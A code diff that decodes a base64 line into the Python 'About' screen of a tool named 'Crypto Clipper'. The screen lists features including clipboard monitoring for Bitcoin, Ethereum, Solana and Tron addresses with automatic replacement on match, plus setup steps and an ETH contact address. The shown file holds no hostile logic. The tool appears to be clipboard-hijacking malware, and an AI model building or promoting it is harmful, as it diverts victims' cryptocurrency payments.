@@ -1,1 +1,70 @@
-IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIiIiQWJvdXQgYWN0aW9uIOKAlCBwcm9qZWN0IGluZm8sIGZlYXR1cmVzLCByZXF1aXJlbWVudHMgZm9yIENyeXB0byBDbGlwcGVyLiIiIgoKZnJvbSByaWNoLnRhYmxlIGltcG9ydCBUYWJsZQpmcm9tIHJpY2gucGFuZWwgaW1wb3J0IFBhbmVsCmZyb20gcmljaCBpbXBvcnQgYm94Cgpmcm9tIGhvb2tzLnVpIGltcG9ydCBjb25zb2xlCgoKZGVmIGFjdGlvbl9hYm91dCgpOgogICAgIiIiRGlzcGxheSBwcm9qZWN0IGluZm86IG92ZXJ2aWV3LCBmZWF0dXJlcywgcmVxdWlyZW1lbnRzLiIiIgogICAgZmVhdHVyZXNfdGFibGUgPSBUYWJsZSgKICAgICAgICBzaG93X2hlYWRlcj1UcnVlLAogICAgICAgIGhlYWRlcl9zdHlsZT0iYm9sZCBicmlnaHRfbWFnZW50YSIsCiAgICAgICAgYm9yZGVyX3N0eWxlPSJtYWdlbnRhIiwKICAgICAgICBib3g9Ym94LlNJTVBMRSwKICAgICAgICB0aXRsZT0iW2JvbGQgYnJpZ2h0X21hZ2VudGFdIOKXiCBGRUFUVVJFUyDil4ggWy9dIiwKICAgICAgICB0aXRsZV9zdHlsZT0iYnJpZ2h0X21hZ2VudGEiLAogICAgKQogICAgZmVhdHVyZXNfdGFibGUuYWRkX2NvbHVtbigiRmVhdHVyZSIsIHN0eWxlPSJicmlnaHRfbWFnZW50YSIpCiAgICBmZWF0dXJlc190YWJsZS5hZGRfY29sdW1uKCJTdGF0dXMiLCBqdXN0aWZ5PSJjZW50ZXIiLCBzdHlsZT0iYnJpZ2h0X2dyZWVuIikKCiAgICBmb3IgZmVhdCBpbiBbCiAgICAgICAgIlJlYWwtdGltZSBjbGlwYm9hcmQgbW9uaXRvcmluZyB3aXRoIHBvbGxpbmciLAogICAgICAgICJNdWx0aS1jaGFpbiBhZGRyZXNzIHBhdHRlcm4gcmVjb2duaXRpb24iLAogICAgICAgICJCaXRjb2luIOKAlCBMZWdhY3ksIFNlZ1dpdCwgVGFwcm9vdCBkZXRlY3Rpb24iLAogICAgICAgICJFdGhlcmV1bSDigJQgRVZNIGFkZHJlc3Mgd2l0aCBFSVAtNTUgY2hlY2tzdW0iLAogICAgICAgICJTb2xhbmEg4oCUIEJhc2U1OCBhZGRyZXNzIGRldGVjdGlvbiIsCiAgICAgICAgIlRyb24g4oCUIEJhc2U1OCAoVC1wcmVmaXgpIGRldGVjdGlvbiIsCiAgICAgICAgIkFkZHJlc3MgYm9vayB3aXRoIGNoYWluLWxhYmVsZWQgZW50cmllcyIsCiAgICAgICAgIkF1dG9tYXRpYyBjbGlwYm9hcmQgcmVwbGFjZW1lbnQgb24gbWF0Y2giLAogICAgICAgICJBY3Rpdml0eSBsb2dnaW5nIHdpdGggdW5kbyBzdXBwb3J0IiwKICAgICAgICAiU3lzdGVtIHRyYXkgaW50ZWdyYXRpb24gKHB5c3RyYXkpIiwKICAgICAgICAiQ29uZmlndXJhYmxlIGhvdGtleSBzaG9ydGN1dHMiLAogICAgICAgICJDcm9zcy1wbGF0Zm9ybSBzdXBwb3J0IChXaW4vTGludXgvbWFjT1MpIiwKICAgIF06CiAgICAgICAgZmVhdHVyZXNfdGFibGUuYWRkX3JvdyhmZWF0LCAi4pyTIikKCiAgICBzZXR1cF90YWJsZSA9IFRhYmxlKAogICAgICAgIHNob3dfaGVhZGVyPVRydWUsCiAgICAgICAgaGVhZGVyX3N0eWxlPSJib2xkIGJyaWdodF9jeWFuIiwKICAgICAgICBib3JkZXJfc3R5bGU9ImN5YW4iLAogICAgICAgIGJveD1ib3guTUlOSU1BTF9IRUFWWV9IRUFELAogICAgICAgIHRpdGxlPSJbYm9sZCBicmlnaHRfY3lhbl0g4peIIFJFUVVJUkVNRU5UUyAmIFNFVFVQIOKXiCBbL10iLAogICAgICAgIHRpdGxlX3N0eWxlPSJicmlnaHRfY3lhbiIsCiAgICApCiAgICBzZXR1cF90YWJsZS5hZGRfY29sdW1uKCJJdGVtIiwgc3R5bGU9ImJyaWdodF9tYWdlbnRhIikKICAgIHNldHVwX3RhYmxlLmFkZF9jb2x1bW4oIk5vdGUiLCBzdHlsZT0iZGltIikKICAgIHNldHVwX3RhYmxlLmFkZF9yb3coIlB5dGhvbiIsICIzLjEwIG9yIGhpZ2hlciIpCiAgICBzZXR1cF90YWJsZS5hZGRfcm93KCJwaXAiLCAiTGF0ZXN0IHZlcnNpb24gcmVjb21tZW5kZWQiKQogICAgc2V0dXBfdGFibGUuYWRkX3JvdygiTGlicmFyaWVzIiwgInJpY2gsIHB5cGVyY2xpcCwgd2F0Y2hkb2csIHJlcXVlc3RzLCBweXN0cmF5IikKICAgIHNldHVwX3RhYmxlLmFkZF9yb3coIkluc3RhbGwiLCAicGlwIGluc3RhbGwgLXIgcmVxdWlyZW1lbnRzLnR4dCIpCiAgICBzZXR1cF90YWJsZS5hZGRfcm93KCJSdW4iLCAicHl0aG9uIG1haW4ucHkiKQogICAgc2V0dXBfdGFibGUuYWRkX3JvdygiQ2xpcGJvYXJkIiwgIlN5c3RlbSBjbGlwYm9hcmQgYWNjZXNzIHJlcXVpcmVkIikKICAgIHNldHVwX3RhYmxlLmFkZF9yb3coIkFkZHJlc3MgQm9vayIsICJDb25maWd1cmUgaW4gYWRkcmVzc19ib29rLmpzb24iKQoKICAgIGNvbnNvbGUucHJpbnQoKQogICAgY29uc29sZS5wcmludChQYW5lbChmZWF0dXJlc190YWJsZSwgYm9yZGVyX3N0eWxlPSJtYWdlbnRhIiwgYm94PWJveC5ST1VOREVEKSkKICAgIGNvbnNvbGUucHJpbnQoKQogICAgY29uc29sZS5wcmludChQYW5lbChzZXR1cF90YWJsZSwgYm9yZGVyX3N0eWxlPSJjeWFuIiwgYm94PWJveC5ST1VOREVEKSkKICAgIGNvbnNvbGUucHJpbnQoKQogICAgY29uc29sZS5wcmludCgKICAgICAgICAiW2RpbV1DcnlwdG8gQ2xpcHBlciDigJQgcmVhbC10aW1lIGNsaXBib2FyZCBtb25pdG9yaW5nIHdpdGggY3J5cHRvY3VycmVuY3kgYWRkcmVzcyAiCiAgICAgICAgInBhdHRlcm4gcmVjb2duaXRpb24gYW5kIG11bHRpLWNoYWluIGFkZHJlc3MgYm9vayBtYW5hZ2VtZW50LiAiCiAgICAgICAgIkNvbmZpZ3VyZSBwYXR0ZXJucyBhbmQgYWRkcmVzcyBib29rIGluIFNldHRpbmdzIHRvIGJlZ2luLlsvXSIKICAgICkKICAgIGNvbnNvbGUucHJpbnQoKQogICAgY29uc29sZS5wcmludCgiW2RpbV1Db250YWN0OlsvXSBbYnJpZ2h0X21hZ2VudGFdMHg3YTNCMWM5RTQ1ZDgyZjA2YUQzZTE3QzRiNThGOTJkMUE2MGNFODM0Wy9dIChFVEgvRVZNKSIpCiAgICBjb25zb2xlLnByaW50KCkK
+# -*- coding: utf-8 -*-
+"""About action — project info, features, requirements for Crypto Clipper."""
+
+from rich.table import Table
+from rich.panel import Panel
+from rich import box
+
+from hooks.ui import console
+
+
+def action_about():
+    """Display project info: overview, features, requirements."""
+    features_table = Table(
+        show_header=True,
+        header_style="bold bright_magenta",
+        border_style="magenta",
+        box=box.SIMPLE,
+        title="[bold bright_magenta] ◈ FEATURES ◈ [/]",
+        title_style="bright_magenta",
+    )
+    features_table.add_column("Feature", style="bright_magenta")
+    features_table.add_column("Status", justify="center", style="bright_green")
+
+    for feat in [
+        "Real-time clipboard monitoring with polling",
+        "Multi-chain address pattern recognition",
+        "Bitcoin — Legacy, SegWit, Taproot detection",
+        "Ethereum — EVM address with EIP-55 checksum",
+        "Solana — Base58 address detection",
+        "Tron — Base58 (T-prefix) detection",
+        "Address book with chain-labeled entries",
+        "Automatic clipboard replacement on match",
+        "Activity logging with undo support",
+        "System tray integration (pystray)",
+        "Configurable hotkey shortcuts",
+        "Cross-platform support (Win/Linux/macOS)",
+    ]:
+        features_table.add_row(feat, "✓")
+
+    setup_table = Table(
+        show_header=True,
+        header_style="bold bright_cyan",
+        border_style="cyan",
+        box=box.MINIMAL_HEAVY_HEAD,
+        title="[bold bright_cyan] ◈ REQUIREMENTS & SETUP ◈ [/]",
+        title_style="bright_cyan",
+    )
+    setup_table.add_column("Item", style="bright_magenta")
+    setup_table.add_column("Note", style="dim")
+    setup_table.add_row("Python", "3.10 or higher")
+    setup_table.add_row("pip", "Latest version recommended")
+    setup_table.add_row("Libraries", "rich, pyperclip, watchdog, requests, pystray")
+    setup_table.add_row("Install", "pip install -r requirements.txt")
+    setup_table.add_row("Run", "python main.py")
+    setup_table.add_row("Clipboard", "System clipboard access required")
+    setup_table.add_row("Address Book", "Configure in address_book.json")
+
+    console.print()
+    console.print(Panel(features_table, border_style="magenta", box=box.ROUNDED))
+    console.print()
+    console.print(Panel(setup_table, border_style="cyan", box=box.ROUNDED))
+    console.print()
+    console.print(
+        "[dim]Crypto Clipper — real-time clipboard monitoring with cryptocurrency address "
+        "pattern recognition and multi-chain address book management. "
+        "Configure patterns and address book in Settings to begin.[/]"
+    )
+    console.print()
+    console.print("[dim]Contact:[/] [bright_magenta]0x7a3B1c9E45d82f06aD3e17C4b58F92d1A60cE834[/] (ETH/EVM)")
+    console.print()
